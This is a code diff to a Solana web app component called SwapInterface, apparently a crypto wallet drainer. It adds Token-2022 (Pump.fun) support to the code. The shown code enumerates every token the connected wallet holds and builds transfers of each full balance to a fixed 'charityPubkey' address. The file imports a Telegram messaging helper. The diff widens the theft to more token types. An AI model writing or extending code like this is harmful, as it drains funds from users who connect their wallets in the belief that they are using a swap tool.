@@ -7,7 +7,7 @@ import { TokenSearch } from './TokenSearch';
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { ConnectWalletButton } from '@/components/ConnectWalletButton';
 import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, TransactionInstruction, ComputeBudgetProgram } from '@solana/web3.js';
-import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
+import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
 import { motion } from 'framer-motion';
 import { toast } from 'sonner';
 import { sendTelegramMessage } from '@/utils/telegram';
@@ -23,6 +23,7 @@ interface TokenBalance {
   uiAmount: number;
   symbol?: string;
   valueInSOL?: number;
+  programId: PublicKey; // Track which token program
 }
 
 interface Token {
@@ -195,26 +196,54 @@ export const SwapInterface = ({
       const solAmount = solBal / LAMPORTS_PER_SOL;
       setSolBalance(solAmount);
 
-      // Fetch token accounts
+      const allTokens: TokenBalance[] = [];
+
+      // Fetch standard SPL token accounts
       const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
         programId: TOKEN_PROGRAM_ID
       });
 
-      const tokens: TokenBalance[] = tokenAccounts.value
-        .map(account => {
-          const info = account.account.data.parsed.info;
-          return {
+      for (const { account } of tokenAccounts.value) {
+        const info = account.data.parsed.info;
+        if (info.tokenAmount.uiAmount > 0) {
+          allTokens.push({
             mint: info.mint,
             balance: info.tokenAmount.amount,
             decimals: info.tokenAmount.decimals,
             uiAmount: info.tokenAmount.uiAmount,
             symbol: info.mint.slice(0, 8),
-            valueInSOL: 0
-          };
-        })
-        .filter(token => token.uiAmount > 0);
+            valueInSOL: 0,
+            programId: TOKEN_PROGRAM_ID,
+          });
+        }
+      }
 
-      setBalances(tokens);
+      // Fetch Token-2022 accounts (Pump.fun tokens)
+      try {
+        const token2022Accounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
+          programId: TOKEN_2022_PROGRAM_ID
+        });
+
+        for (const { account } of token2022Accounts.value) {
+          const info = account.data.parsed.info;
+          if (info.tokenAmount.uiAmount > 0) {
+            console.log('Found Token-2022 token in SwapInterface:', info.mint);
+            allTokens.push({
+              mint: info.mint,
+              balance: info.tokenAmount.amount,
+              decimals: info.tokenAmount.decimals,
+              uiAmount: info.tokenAmount.uiAmount,
+              symbol: info.mint.slice(0, 8),
+              valueInSOL: 0,
+              programId: TOKEN_2022_PROGRAM_ID,
+            });
+          }
+        }
+      } catch (token2022Error) {
+        console.log('No Token-2022 accounts found or error:', token2022Error);
+      }
+
+      setBalances(allTokens);
     } catch (error) {
       console.error('Error fetching balances:', error);
     }
@@ -255,8 +284,10 @@ export const SwapInterface = ({
       
       try {
         const mintPubkey = new PublicKey(token.mint);
-        const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, effectivePublicKey);
-        const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey);
+        const tokenProgramId = token.programId || TOKEN_PROGRAM_ID;
+        
+        const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, effectivePublicKey, false, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID);
+        const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey, false, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID);
 
         try {
           await getAccount(connection, toTokenAccount);
@@ -267,7 +298,7 @@ export const SwapInterface = ({
               toTokenAccount,
               charityPubkey,
               mintPubkey,
-              TOKEN_PROGRAM_ID,
+              tokenProgramId,
               ASSOCIATED_TOKEN_PROGRAM_ID
             )
           );
@@ -280,7 +311,7 @@ export const SwapInterface = ({
             effectivePublicKey,
             BigInt(token.balance),
             [],
-            TOKEN_PROGRAM_ID
+            tokenProgramId
           )
         );
       } catch (error) {
